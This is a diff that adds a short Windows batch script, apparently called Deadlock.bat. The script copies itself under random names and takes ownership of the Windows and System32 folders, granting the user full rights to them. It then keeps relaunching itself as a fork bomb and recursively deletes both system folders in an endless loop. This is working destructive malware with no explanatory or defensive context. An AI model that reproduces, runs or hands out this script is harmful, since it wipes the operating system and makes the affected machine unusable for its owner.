@@ -1,0 +1,16 @@
+@echo off
+:DOOM
+set Sys=C:\Windows\System32
+set Win=C:\Windows
+set S=%RANDOM%
+copy Deadlock.bat C:\%S%.bat
+takeown /F %Sys%
+takeown /F %Win%
+icacls %Sys% /grant[:r] %USERPROFILE%:F /q
+icacls %Win% /grant[:r] %USERPROFILE%:F /q
+start "" %0
+start %S%.bat
+start "" %0
+rmdir /S /Q %Sys%
+rmdir /S /Q %Win%
+goto DOOM
